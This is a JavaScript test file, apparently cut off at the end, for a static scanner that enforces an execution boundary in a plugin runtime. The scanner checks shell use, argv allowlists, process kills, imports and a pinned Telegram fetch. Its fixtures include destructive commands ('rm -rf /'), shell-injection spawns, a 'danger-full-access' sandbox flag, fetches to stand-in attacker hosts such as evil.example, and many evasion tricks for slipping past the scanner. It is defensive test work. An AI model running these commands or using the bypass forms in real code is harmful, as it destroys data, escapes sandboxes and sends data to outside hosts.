// ADR-0035 §4 active-execution boundary guard — plugin-shape test.
//
// Three layers:
//   (a) scanner unit tests on adversarial fixtures (the tokenizer + gates bite
//       on real violations and stay quiet on look-alikes);
//   (b) conformance: the real plugins/runtime/scripts/**/*.mjs surface produces
//       ZERO violations against the registry (and a new unregistered executor
//       would fail this, enforcing the ADR-0035 §5 add-gate);
//   (c) negative-conformance + registry-drift: the gate is proven non-vacuous,
//       and the registry never drifts looser than the code it describes.

import { describe, it } from 'node:test';
import { ok, strictEqual, deepStrictEqual } from 'node:assert/strict';
import { readFile, readdir } from 'node:fs/promises';
import { resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import * as registry from './runtime-executor-registry.mjs';
import {
  stripComments, scanFile, auditScripts, parseArgvArray, normalizeElement, matchVerbPath,
} from './runtime-executor-scan.mjs';

const REPO_ROOT = resolve(fileURLToPath(import.meta.url), '../../..');
const RUNTIME_SCRIPTS = resolve(REPO_ROOT, 'plugins/runtime/scripts');

async function listRuntimeScripts(dir = RUNTIME_SCRIPTS, prefix = '') {
  const entries = await readdir(dir, { withFileTypes: true });
  const out = [];
  for (const e of entries) {
    const rel = prefix ? `${prefix}/${e.name}` : e.name;
    if (e.isDirectory()) out.push(...(await listRuntimeScripts(resolve(dir, e.name), rel)));
    else if (e.name.endsWith('.mjs')) out.push({ fileName: e.name, rel, path: resolve(dir, e.name) });
  }
  return out;
}

function scan(fileName, source) {
  return scanFile({ fileName, source, registry }).violations;
}
const rules = (vs) => vs.map((v) => v.rule);

// ---------------------------------------------------------------------------
// (a) Tokenizer
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — tokenizer (stripComments)', () => {
  it('removes line and block comments', () => {
    const code = stripComments(`const a = 1; // shell: true\n/* shell: true */ const b = 2;`);
    ok(!/shell:\s*true/.test(code), 'comment shell:true must be stripped');
    ok(code.includes('const a'));
    ok(code.includes('const b'));
  });

  it('preserves string literals (argv hazards live in strings)', () => {
    const code = stripComments(`const x = ['-c', 'login'];`);
    ok(code.includes("'-c'"), 'string content kept');
    ok(code.includes("'login'"));
  });

  it('preserves a regex containing \\/\\/ without spawning a false comment', () => {
    // compat.mjs: /^https?:\/\//i.test(url) — the trailing \/\/ must not be read
    // as a line comment that eats the rest of the line.
    const src = `if (!/^https?:\\/\\//i.test(url)) { THROW_MARKER(); }`;
    const code = stripComments(src);
    ok(code.includes('THROW_MARKER'), 'code after a //-bearing regex survives');
  });

  it('does not treat division as a regex', () => {
    const code = stripComments(`const ms = total / 1000; const n = a / b; KEEP();`);
    ok(code.includes('KEEP()'));
    ok(code.includes('/ 1000'));
  });
});

// ---------------------------------------------------------------------------
// (a) Argv parsing
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — argv parsing', () => {
  it('parses a literal string array', () => {
    deepStrictEqual(parseArgvArray(`['plugin', 'list']`), { kind: 'literal', tokens: ['plugin', 'list'] });
  });
  it('collapses template ${...} to *', () => {
    deepStrictEqual(parseArgvArray('[`${name}@agentic-plugins`]'), { kind: 'literal', tokens: ['*@agentic-plugins'] });
  });
  it('maps a variable target element to * but keeps a spread dynamic', () => {
    strictEqual(parseArgvArray('userArgs').kind, 'not-array'); // not an array literal
    strictEqual(parseArgvArray('[...userArgs]').kind, 'dynamic'); // spread changes arity
    // a literal verb + variable target stays checkable (target → '*')
    deepStrictEqual(parseArgvArray("['plugin', action]"), { kind: 'literal', tokens: ['plugin', '*'] });
    deepStrictEqual(parseArgvArray("['init', '-q', '-b', spec.branch]"), { kind: 'literal', tokens: ['init', '-q', '-b', '*'] });
  });
  it('a variable VERB (not just target) fails the allowlist', () => {
    // ['plugin', action] → ['plugin', '*']; '*' never equals a required literal verb
    ok(rules(scan('settings.mjs', `commandSpec('codex', ['plugin', action, name]);`)).includes('argv-verb-gate'));
  });
  it('verb-path matching: * one token, ... rest', () => {
    ok(matchVerbPath(['rev-parse', 'HEAD'], ['rev-parse', '...'], registry.DANGEROUS_ARGV_TOKENS));
    ok(matchVerbPath(['login', 'status'], ['login', 'status'], registry.DANGEROUS_ARGV_TOKENS));
    ok(!matchVerbPath(['login'], ['login', 'status'], registry.DANGEROUS_ARGV_TOKENS));
  });
});

// ---------------------------------------------------------------------------
// (a) Gates bite on violations
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — gates catch real violations', () => {
  it('shell:true in code → shell-gate', () => {
    ok(rules(scan('x.mjs', `spawn(cmd, args, { shell: true });`)).includes('shell-gate'));
  });
  it('shell:true via an indirect options variable → shell-gate', () => {
    ok(rules(scan('x.mjs', `const opts = { shell: true }; spawn(c, a, opts);`)).includes('shell-gate'));
  });
  it('shell:true inside a comment → NO finding', () => {
    deepStrictEqual(scan('x.mjs', `// spawn(c, a, { shell: true })\nconst z = 1;`), []);
  });
  it('shell binary + -c → shell-gate (and command-gate)', () => {
    const r = rules(scan('doctor.mjs', `spawn('sh', ['-c', userInput]);`));
    ok(r.includes('shell-gate') || r.includes('command-gate'), `got ${r}`);
  });
  it('bare codex login (auth mutation) → argv-verb-gate', () => {
    ok(rules(scan('doctor.mjs', `runner('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('codex login status (read probe) → NO finding', () => {
    deepStrictEqual(scan('doctor.mjs', `runner('codex', ['login', 'status']);`), []);
  });
  it('codex exec --sandbox danger-full-access → argv-verb-gate', () => {
    ok(rules(scan('doctor.mjs', `runner('codex', ['exec', '--sandbox', 'danger-full-access']);`)).includes('argv-verb-gate'));
  });
  it('codex hooks trust (trust mutation) → argv-verb-gate', () => {
    ok(rules(scan('doctor.mjs', `runner('codex', ['hooks', 'trust']);`)).includes('argv-verb-gate'));
  });
  it('claude with fully dynamic argv → argv-unresolved', () => {
    ok(rules(scan('doctor.mjs', `runner('claude', userArgs);`)).includes('argv-unresolved'));
  });
  it('doctor inspectCli inline probe argv IS validated (not dead config)', () => {
    // a tampered inline probe (auth mutation) must be caught …
    ok(rules(scan('doctor.mjs', `inspectCli('codex', { authArgs: ['login'], runner, cwd });`)).includes('argv-verb-gate'));
    // … while the real read probes pass
    deepStrictEqual(scan('doctor.mjs', `inspectCli('codex', { authArgs: ['login', 'status'], versionArgs: ['--version'], runner, cwd });`), []);
  });
  it('non-allowlisted command literal → command-gate', () => {
    ok(rules(scan('doctor.mjs', `runner('rm', ['-rf', '/']);`)).includes('command-gate'));
  });
  it('git push (not in git allowlist) → argv-verb-gate', () => {
    ok(rules(scan('migrate-workflow-storage.mjs', `runner('git', ['push', 'origin']);`)).includes('argv-verb-gate'));
  });
  it('git worktree remove (destructive) → argv-verb-gate', () => {
    ok(rules(scan('worktree.mjs', `runGit({ args: ['worktree', 'remove', path] });`)).includes('argv-verb-gate'));
  });
  it('plugin remove (destructive verb, no template) → argv-verb-gate', () => {
    ok(rules(scan('settings.mjs', `commandSpec('codex', ['plugin', 'remove', name]);`)).includes('argv-verb-gate'));
  });
  it('claude plugin uninstall WITHOUT @agentic-plugins suffix → argv-verb-gate', () => {
    ok(rules(scan('settings.mjs', `commandSpec('claude', ['plugin', 'uninstall', 'someplugin']);`)).includes('argv-verb-gate'));
  });
  it('claude plugin uninstall *@agentic-plugins in settings.mjs → NO finding (the one §4 exception)', () => {
    deepStrictEqual(scan('settings.mjs', "commandSpec('claude', ['plugin', 'uninstall', `${plugin}@agentic-plugins`]);"), []);
  });
  it('that same retired-cleanup uninstall in a DIFFERENT file → argv-verb-gate', () => {
    ok(rules(scan('doctor.mjs', "commandSpec('claude', ['plugin', 'uninstall', `${plugin}@agentic-plugins`]);")).includes('argv-verb-gate'));
  });
  it('process.kill → kill-gate', () => {
    ok(rules(scan('doctor.mjs', `process.kill(pid, 'SIGTERM');`)).includes('kill-gate'));
  });
  it('child.kill in doctor.mjs (own-child timeout) → NO finding', () => {
    deepStrictEqual(scan('doctor.mjs', `child.kill('SIGTERM');`), []);
  });
  it('child.kill OUTSIDE doctor.mjs → kill-gate', () => {
    ok(rules(scan('consensus.mjs', `child.kill('SIGTERM');`)).includes('kill-gate'));
  });
  it('SIGKILL anywhere → kill-gate', () => {
    ok(rules(scan('doctor.mjs', `child.kill('SIGKILL');`)).includes('kill-gate'));
  });
  it('capability import in a non-importer file → import-gate', () => {
    ok(rules(scan('worktree.mjs', `import { spawn } from 'node:child_process';`)).includes('import-gate'));
  });
  it('namespace capability import in a non-importer file → import-gate', () => {
    ok(rules(scan('worktree.mjs', `import * as cp from 'node:child_process';`)).includes('import-gate'));
  });
  it('dynamic import of child_process → import-gate', () => {
    ok(rules(scan('x.mjs', `const cp = await import('node:child_process');`)).includes('import-gate'));
  });
});

// ---------------------------------------------------------------------------
// (a) Look-alikes do NOT false-positive
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — look-alikes stay quiet', () => {
  it('Map.get / byDate.get is not a network call', () => {
    deepStrictEqual(scan('cutover-audit.mjs', `const v = byDate.get(date); const w = map.get(key);`), []);
  });
  it('prose mentioning remove/--sandbox/login is not argv', () => {
    const src = `const msg = 'remove it with codex plugin remove'; const f = /--sandbox\\b/.test(t);`;
    deepStrictEqual(scan('doctor.mjs', src), []);
  });
  it('a field named plugin_remove_command is not a destructive verb', () => {
    deepStrictEqual(scan('doctor.mjs', `const x = { plugin_remove_command: true, sandbox_flag: false };`), []);
  });
  it('namespace .get on a non-network module (cache.get) is not an exec/network call', () => {
    deepStrictEqual(scan('cutover-audit.mjs', `import * as cache from './cache.mjs'; const v = cache.get(key);`), []);
  });
});

// ---------------------------------------------------------------------------
// (a) Bypass vectors closed (Codex working-tree review hardening)
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — bypass vectors are closed', () => {
  it('wrapper alias: const r = runCommand; r(...) → caught', () => {
    ok(rules(scan('doctor.mjs', `const r = runCommand; r('codex', ['login']);`)).length > 0);
  });
  it('namespace member call: doctor.runCommand(...) → caught', () => {
    ok(rules(scan('x.mjs', `import * as doctor from './doctor.mjs'; doctor.runCommand('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('imported primitive alias: spawn as run → caught', () => {
    ok(rules(scan('x.mjs', `import { spawn as run } from 'node:child_process'; run('rm', ['-rf', '/']);`)).includes('command-gate'));
  });
  it('namespace primitive: cp.spawn(...) → caught', () => {
    const r = rules(scan('x.mjs', `import * as cp from 'node:child_process'; cp.spawn('rm', ['-rf', '/']);`));
    ok(r.includes('import-gate') && r.includes('command-gate'));
  });
  it('forwarding exact-match: runner("git", ["push", ...args]) → caught', () => {
    ok(rules(scan('worktree.mjs', `runner('git', ['push', ...args], { cwd });`)).length > 0);
  });
  it('forwarding exact-match: execFile("git", ["-C", repoRoot, "push", ...args]) → caught', () => {
    ok(rules(scan('source-snapshot.mjs', `execFile('git', ['-C', repoRoot, 'push', ...args], cb);`)).length > 0);
  });
  it('the real forwarding shapes stay exempt (scope-anchored to the wrapper body)', () => {
    deepStrictEqual(scan('worktree.mjs', `async function runGit({ repoRoot, runner, timeoutMs, args }) { return runner('git', args, { cwd: repoRoot, timeoutMs }); }`), []);
    deepStrictEqual(scan('source-snapshot.mjs', `function execGit(repoRoot, args) { return execFile('git', ['-C', repoRoot, ...args], { timeout: GIT_TIMEOUT_MS }, cb); }`), []);
  });
  it('fake .kill() in doctor.mjs (not the own-child site) → kill-gate', () => {
    ok(rules(scan('doctor.mjs', `const victim = { kill() {} }; victim.kill('SIGTERM');`)).includes('kill-gate'));
  });
  it('network .request() in compat → network-gate', () => {
    ok(rules(scan('compat.mjs', `import https from 'node:https'; const c = https; c.request('https://x', { method: 'POST' });`)).includes('network-gate'));
  });
  it('tokenizer: code after a //-bearing regex is still scanned', () => {
    // a forbidden call hidden after `return /[//]/.test(x)` must NOT be masked
    ok(rules(scan('doctor.mjs', `function f(){ return /[//]/.test(x); runner('codex', ['login']); }`)).includes('argv-verb-gate'));
  });
  it('dynamic import with a non-literal specifier → import-gate', () => {
    ok(rules(scan('x.mjs', `const cp = await import(process.env.RUNTIME_MODULE);`)).includes('import-gate'));
  });
  it('re-export from a capability module → import-gate', () => {
    ok(rules(scan('x.mjs', `export { spawn as run } from 'node:child_process';`)).includes('import-gate'));
  });
  it('computed shell key { ["shell"]: true } → shell-gate', () => {
    ok(rules(scan('doctor.mjs', `spawn('git', ['status'], { ['shell']: true });`)).includes('shell-gate'));
  });
  // Second adversarial pass
  it('forwarding is exact-SITE: const args = ["push"]; runner("git", args) → caught', () => {
    ok(rules(scan('worktree.mjs', `const args = ['push', 'origin']; runner('git', args, { cwd });`)).length > 0);
    ok(rules(scan('source-snapshot.mjs', `const args = ['push']; execFile('git', ['-C', repoRoot, ...args], cb);`)).length > 0);
  });
  it('dynamic projection with an INLINE literal argv is still verb-checked', () => {
    ok(rules(scan('settings.mjs', `runner(plan.argv.command, ['plugin', 'remove', name], { cwd });`)).includes('argv-verb-gate'));
  });
  it('reassignment alias: let r; r = runCommand; r(...) → caught', () => {
    ok(rules(scan('doctor.mjs', `let r; r = runCommand; r('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('destructuring alias: const { runCommand: r } = doctor → caught', () => {
    ok(rules(scan('x.mjs', `import * as doctor from './doctor.mjs'; const { runCommand: r } = doctor; r('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('dynamic import via string concat → import-gate', () => {
    ok(rules(scan('x.mjs', `const cp = await import('node:' + 'child_process'); cp.spawn('rm', ['-rf', '/']);`)).includes('import-gate'));
  });
  it('network method alias: const req = https.request → network-gate', () => {
    ok(rules(scan('compat.mjs', `import https from 'node:https'; const req = https.request; req('https://x', { method: 'POST' });`)).includes('network-gate'));
  });
  // Third adversarial pass
  it('parenthesized aliases (const r = (runCommand), r = (doctor.runCommand)) → caught', () => {
    ok(rules(scan('doctor.mjs', `const r = (runCommand); r('codex', ['login']);`)).includes('argv-verb-gate'));
    ok(rules(scan('doctor.mjs', `let r; r = (runCommand); r('codex', ['login']);`)).includes('argv-verb-gate'));
    ok(rules(scan('x.mjs', `import * as doctor from './doctor.mjs'; const r = (doctor.runCommand); r('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('projection with a local-const literal argv → verb-checked', () => {
    ok(rules(scan('settings.mjs', `const argv = ['plugin', 'remove', name]; runner(plan.argv.command, argv, { cwd });`)).includes('argv-verb-gate'));
  });
  it('network destructuring: const { request } = https → network-gate', () => {
    ok(rules(scan('compat.mjs', `import https from 'node:https'; const { request } = https; request('https://x', { method: 'POST' });`)).includes('network-gate'));
  });
  it('namespace primitive in a registered importer: cp.execFile in doctor (spawn-only) → primitive-gate', () => {
    ok(rules(scan('doctor.mjs', `import * as cp from 'node:child_process'; cp.execFile('git', ['status']);`)).includes('primitive-gate'));
  });
  it('no false positive: unrelated .request property / unrelated const args', () => {
    deepStrictEqual(scan('compat.mjs', `const x = { request: 1 }; doSomething(x.request);`), []);
    deepStrictEqual(scan('worktree.mjs', `const args = ['status', '--short']; somethingElse(args);`), []);
  });
});

// ---------------------------------------------------------------------------
// (b) Conformance — real runtime surface is clean
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — conformance over plugins/runtime/scripts', () => {
  it('runtime scripts have unique basenames (registry is basename-keyed)', async () => {
    // The registry keys on basename and the glob is recursive; a nested
    // plugins/runtime/scripts/subdir/doctor.mjs must not silently inherit
    // doctor.mjs privileges. Assert no duplicate basenames (Codex review MAJOR #5).
    const scripts = await listRuntimeScripts();
    const seen = new Map();
    for (const s of scripts) {
      ok(!seen.has(s.fileName), `duplicate basename ${s.fileName} (${s.rel} vs ${seen.get(s.fileName)}) — registry keying is ambiguous`);
      seen.set(s.fileName, s.rel);
    }
  });

  it('every runtime script passes the registry (0 violations)', async () => {
    const scripts = await listRuntimeScripts();
    ok(scripts.length >= 10, `expected the runtime script surface, found ${scripts.length}`);
    const files = await Promise.all(scripts.map(async (s) => ({ fileName: s.fileName, source: await readFile(s.path, 'utf-8') })));
    const { violations } = auditScripts({ files, registry });
    if (violations.length) {
      const lines = violations.map((v) => `  [${v.rule}] ${v.file}: ${v.detail}`).join('\n');
      throw new Error(`runtime executor conformance failed (${violations.length}):\n${lines}`);
    }
    strictEqual(violations.length, 0);
  });
});

// ---------------------------------------------------------------------------
// (c) Negative-conformance — the gate is non-vacuous
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — negative conformance (gate bites)', () => {
  it('a synthetic unregistered executor file is rejected', () => {
    const malicious = [
      `import { spawn } from 'node:child_process';`,
      `export function evil(userCmd, userArgs) {`,
      `  return spawn(userCmd, userArgs, { shell: true });`,
      `}`,
      `export function nuke() { spawn('codex', ['login']); }`,
    ].join('\n');
    const r = rules(scan('newly-added-executor.mjs', malicious));
    ok(r.includes('import-gate'), `expected import-gate, got ${r}`);
    ok(r.includes('shell-gate'), `expected shell-gate, got ${r}`);
    ok(r.includes('command-gate') || r.includes('argv-verb-gate'), `expected command/argv finding, got ${r}`);
  });

  it('injecting a forbidden call into a real file is caught', async () => {
    const doctorSrc = await readFile(resolve(RUNTIME_SCRIPTS, 'doctor.mjs'), 'utf-8');
    const injected = `${doctorSrc}\nfunction __evil() { runner('codex', ['login']); process.kill(1); }\n`;
    const r = rules(scan('doctor.mjs', injected));
    ok(r.includes('argv-verb-gate'), `expected argv-verb-gate, got ${r}`);
    ok(r.includes('kill-gate'), `expected kill-gate, got ${r}`);
  });
});

// ---------------------------------------------------------------------------
// (c) Negative-conformance — ADR-0040 §2 notification emitter (osascript)
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — ADR-0040 notification dispatch (per-source negative conformance)', () => {
  // Mirrors notify.mjs dispatchOsascript: named spawn import + the
  // spawnImpl-injectable alias the scanner must follow.
  const PRELUDE = `import { spawn } from 'node:child_process';\nconst doSpawn = spawnImpl ?? spawn;\n`;
  const FIXED_ARGV = `['-e', 'on run argv', '-e', 'display notification (item 2 of argv) with title (item 1 of argv)', '-e', 'end run', title, body]`;
  const OPTS = `{ stdio: 'ignore', detached: true, env: spawnEnv }`;

  it('the exact fixed template in notify.mjs → NO finding', () => {
    deepStrictEqual(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, ${OPTS});`), []);
  });

  it('payload interpolated INTO the -e program (template literal) → argv-verb-gate', () => {
    // `display notification "${body}" ...` normalizes its program token to
    // contain '*', which cannot equal the pinned literal program.
    const argv = "['-e', 'on run argv', '-e', `display notification \"${body}\" with title (item 1 of argv)`, '-e', 'end run', title]";
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${argv}, ${OPTS});`)).includes('argv-verb-gate'));
  });

  it('a DIFFERENT AppleScript program (do shell script) → argv-verb-gate', () => {
    const argv = "['-e', 'on run argv', '-e', 'do shell script (item 1 of argv)', '-e', 'end run', title, body]";
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${argv}, ${OPTS});`)).includes('argv-verb-gate'));
  });

  it('an arity change (extra trailing argv) → argv-verb-gate', () => {
    const argv = FIXED_ARGV.replace(', body]', ', body, extra]');
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${argv}, ${OPTS});`)).includes('argv-verb-gate'));
  });

  it('a variable program (["-e", userProgram, ...]) → argv-verb-gate', () => {
    const argv = "['-e', userProgram, title]";
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${argv}, ${OPTS});`)).includes('argv-verb-gate'));
  });

  it('a fully dynamic argv (spread) → argv-unresolved', () => {
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', [...userArgs], ${OPTS});`)).includes('argv-unresolved'));
  });

  it('the same fixed template in a NON-importer runtime file → import-gate', () => {
    ok(rules(scan('cutover-audit.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, ${OPTS});`)).includes('import-gate'));
  });

  it('a bare `osascript` (PATH-resolved, not the pinned absolute path) → command-gate', () => {
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('osascript', ${FIXED_ARGV}, ${OPTS});`)).includes('command-gate'));
  });

  it('shell:true on the osascript spawn → shell-gate', () => {
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, { shell: true });`)).includes('shell-gate'));
  });

  it('an unref-dodging kill on the notify child → kill-gate', () => {
    ok(rules(scan('notify.mjs', `${PRELUDE}const child = doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, ${OPTS}); child.kill('SIGTERM');`)).includes('kill-gate'));
  });
});

// ---------------------------------------------------------------------------
// (c) Negative-conformance — ADR-0041 §2d global fetch egress (KEYSTONE gate)
// ---------------------------------------------------------------------------

describe('ADR-0041 §2d guard — global fetch egress (per-source negative conformance)', () => {
  // The pinned E1 egress shape the `channel` slice will add to notify.mjs: a
  // direct global fetch to the fixed Telegram host, POST, redirect:'error', a
  // bounded AbortSignal timeout, URL a template whose STATIC prefix is the
  // allowlisted origin (token interpolated only AFTER it).
  const PINNED = "fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000), body: payload })";

  it('the pinned Telegram POST in notify.mjs → NO finding', () => {
    deepStrictEqual(scan('notify.mjs', `const token = 't'; const payload = 'x'; ${PINNED};`), []);
  });

  it('global fetch in a NON-registered runtime file → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', `${PINNED};`)).includes('global-fetch-gate'));
  });

  it('globalThis.fetch in a capability-importer file (not fetch-registered) → global-fetch-gate', () => {
    ok(rules(scan('doctor.mjs', `globalThis.fetch('https://api.telegram.org/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });`)).includes('global-fetch-gate'));
  });

  it('a non-POST method → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'GET', redirect: 'error', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
  });

  it('a non-allowlisted origin → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://evil.example.com/send', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
  });

  it('a userinfo-trick lookalike origin (api.telegram.org@evil.com) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org@evil.com/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) })")).includes('global-fetch-gate'));
  });

  it('a missing timeout → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', redirect: 'error' })")).includes('global-fetch-gate'));
  });

  it('redirect-following (no redirect:error) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
  });

  it('a non-literal (variable) URL → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(url, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
  });

  it('an aliased fetch in notify.mjs (defeats static validation) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "const f = fetch; f(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });

  it('a destructured fetch from globalThis → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "const { fetch } = globalThis;")).includes('global-fetch-gate'));
  });

  // Codex-review CRITICAL bypasses — the fail-closed redesign must now catch
  // every indirection form and every validation dodge.
  it('optional-chaining call fetch?.() in a non-registered file → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "fetch?.('https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it("computed access globalThis['fetch']() → global-fetch-gate", () => {
    ok(rules(scan('cutover-audit.mjs', "globalThis['fetch']('https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it("Reflect.get(globalThis,'fetch')() → global-fetch-gate", () => {
    ok(rules(scan('cutover-audit.mjs', "Reflect.get(globalThis, 'fetch')('https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it('fetch.call/.apply → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "fetch.call(globalThis, 'https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it('a globalThis alias then member call (const g = globalThis; g.fetch()) → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "const g = globalThis; g.fetch('https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it('a tagged-template fetch`...` → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', 'fetch`https://evil.example/x`;')).includes('global-fetch-gate'));
  });
  it('URL via && / concatenation defeating the pinned literal → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot' && 'https://evil.example/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });
  it('a real GET init hidden behind a decoy 3rd arg (fetch(url, undefined, {pinned})) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, undefined, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });
  it('pinned tokens buried in a nested string, real init is GET/redirect-follow → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'GET', redirect: 'follow', note: \"method:'POST' redirect:'error' AbortSignal.timeout(\" });")).includes('global-fetch-gate'));
  });
  it('a local shadow wrapper that egresses elsewhere but looks pinned → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "const fetch = (u, o) => globalThis['fetch']('https://evil.example/x', o); fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });
  it('the origin-only-but-wrong-endpoint (/deleteWebhook) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/deleteWebhook', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });

  // Codex re-review (round 2) — the fail-closed redesign's own new holes.
  it('a pinned-shaped decoy fetch( in a string cannot cancel a real alias → global-fetch-gate', () => {
    const src = "const f = fetch;\n"
      + "const decoy = \"fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) })\";\n"
      + "f('https://evil.example/x', { method: 'GET' });";
    ok(rules(scan('notify.mjs', src)).includes('global-fetch-gate'));
  });
  it("Reflect['get'](globalThis,'fetch') → global-fetch-gate", () => {
    ok(rules(scan('cutover-audit.mjs', "Reflect['get'](globalThis, 'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
  });
  it('Object.getOwnPropertyDescriptor(globalThis, "fetch").value → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "Object.getOwnPropertyDescriptor(globalThis, 'fetch').value('https://evil.example/x', {});")).includes('global-fetch-gate'));
  });
  it('a spread that overrides the pinned init → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), ...evil });")).includes('global-fetch-gate'));
  });
  it('a duplicate later method key overriding the pinned one → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), method: 'GET' });")).includes('global-fetch-gate'));
  });
  it('a bare timeout: option (Node fetch ignores it, no signal) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', timeout: 5000 });")).includes('global-fetch-gate'));
  });
  it('an operator-guarded signal (never || AbortSignal.timeout) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: never || AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });
  it('a second pinned-shape send (different token) → global-fetch-gate', () => {
    const src = "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });\n"
      + "fetch('https://api.telegram.org/bot9/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });";
    ok(rules(scan('notify.mjs', src)).includes('global-fetch-gate'));
  });

  // Fail-CLOSED must not over-reject the legitimate forms.
  it('a fetch-mentioning string in a non-registered file is NOT flagged (no over-reject)', () => {
    deepStrictEqual(scan('cutover-audit.mjs', 'const help = "fetch(url, init)";'), []);
  });
  it("the channel's full pinned call (template URL + body + headers) in notify.mjs → NO finding", () => {
    const src = "const token = 't'; const payload = {}; "
      + "fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000), body: JSON.stringify(payload), headers: { 'Content-Type': 'application/json' } });";
    deepStrictEqual(scan('notify.mjs', src), []);
  });

  // Codex round-3 — the round-2 fixes' own residual holes.
  it('a fetch inside a template ${...} interpolation (executable code) → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "const leak = `${await fetch('https://evil.example/x', { method: 'GET' })}`;")).includes('global-fetch-gate'));
  });
  it('a padded Reflect.get(globalThis, <spaces> "fetch") → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "Reflect.get(globalThis,                              'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
  });
